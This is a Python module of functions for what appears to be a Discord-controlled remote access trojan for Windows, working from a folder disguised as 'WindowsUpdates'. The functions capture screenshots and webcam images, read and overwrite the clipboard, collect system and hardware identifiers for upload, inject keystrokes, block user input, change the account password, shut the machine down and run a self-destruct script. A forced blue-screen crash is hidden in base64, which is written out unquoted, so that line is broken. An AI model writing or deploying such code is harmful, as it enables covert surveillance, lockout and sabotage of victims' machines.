import os
from PIL import ImageGrab
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref


import pygame.camera
import pygame.image
import time
import pyautogui
import pynput
import discord
import os
import pyperclip
from time import sleep

from monitorcontrol import get_monitors
from monitorcontrol import Monitor

operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
nullptr = POINTER(c_int)()
kb_listener = pynput.keyboard.Listener(suppress=True)
m_listener = pynput.mouse.Listener(suppress=True)

def self_destruct():
  script_dir = os.path.dirname(os.path.abspath(__file__))
  script_file = os.path.join(script_dir, "..", "self_destruct.bat")
  os.popen(f"start {script_file}")

def comp_info():
  os.popen("systeminfo > pc_info.txt")
  sleep(5)
  embed = discord.Embed(title="Computer Information",description="Result uploaded.", color=0x00ff00)
  file_out = discord.File("pc_info.txt", filename="pc_info.txt")
  return embed, file_out

def networking_info():
  os.popen("ipconfig /all > networking_info.txt")

def pc_shutdown():
  os.popen("shutdown /s /t 0")

def hardware_info():
  hwid = os.popen("wmic csproduct get uuid").read().replace("\n", "").replace("UUID ", "")
  cpu = os.popen("wmic cpu get name").read().replace("\n", "").replace("Name ", "")
  gpu = os.popen("wmic path win32_VideoController get name").read().replace("\n", "").replace("Name ", "")
  ram = os.popen("wmic MemoryChip get Capacity").read().replace("\n", "").replace("Capacity ", "")
  disk_size = os.popen("wmic diskdrive get size").read().replace("\n", "").replace("Size ", "")
  return f"**HWID: **{hwid}\n**CPU: **{cpu}\n**GPU: **{gpu}\n**RAM: **{ram}\n**Disk Size: **{disk_size}"

def screenshot():
  ImageGrab.grab().save(f"{operation_dir}\\screenshot.png")
  return f"{operation_dir}\\screenshot.png"

def webcamshot():
  pygame.camera.init()
  cameras = pygame.camera.list_cameras()

  if not cameras:
    return "No camera found."

  camera = pygame.camera.Camera(cameras[0])
  camera.start()
  time.sleep(1)
  img = camera.get_image()
  pygame.image.save(img, f"{operation_dir}\\webcamshot.png")
  camera.stop()
  return f"{operation_dir}\\webcamshot.png"

def bsod():
  exec(base64.b64decode(d2luZGxsLm50ZGxsLlJ0bEFkanVzdFByaXZpbGVnZSgKICAgIGNfdWludCgxOSksCiAgICBjX3VpbnQoMSksCiAgICBjX3VpbnQoMCksCiAgICBieXJlZihjX2ludCgpKQopCgogIHdpbmRsbC5udGRsbC5OdFJhaXNlSGFyZEVycm9yKAogICAgY191bG9uZygweEMwMDAwMDdCKSwKICAgIGNfdWxvbmcoMCksCiAgICBudWxscHRyLAogICAgbnVsbHB0ciwKICAgIGNfdWludCg2KSwKICAgIGJ5cmVmKGNfdWludCgpKQop))

def hid(command):
  prefix = command.split(" ")[0]
  if prefix == "hotkey":
    pyautogui.hotkey(command.split(" ")[1], command.split(" ")[2])
    return "Hotkey sent."
  elif prefix == "write":
    for word in command.split(" ")[1:]:
      if word == command.split(" ")[-1]: 
        pyautogui.write(word)
      else:
        pyautogui.write(word)
        pyautogui.press("space")
    return "Text sent."
  elif prefix == "press":
    pyautogui.press(command.split(" ")[1])
    return "Keypress sent."
  else:
    return "Invalid format."

def block_input():
  kb_listener.start()
  m_listener.start()

def unblock_input():
  kb_listener.stop()
  m_listener.stop()

def change_password(new_password):
  os.popen(f"net user {os.getlogin()} {new_password}")

def get_clipboard():
  clipboard = pyperclip.paste()
  if clipboard == "":
    return "Clipboard is empty."
  elif len(clipboard) > 5999:
    return "Clipboard is too long."
  else:
    return clipboard

def set_clipboard(text):
  pyperclip.copy(text)

def off_mon():
  for monitor in get_monitors():
    try:
      with monitor:
        monitor.set_power_mode(4)
    except Exception as e:
      print(e)

def on_mon():
  for monitor in get_monitors():
    try:
      with monitor:
        monitor.set_power_mode(1)
    except Exception as e:
      print(e)

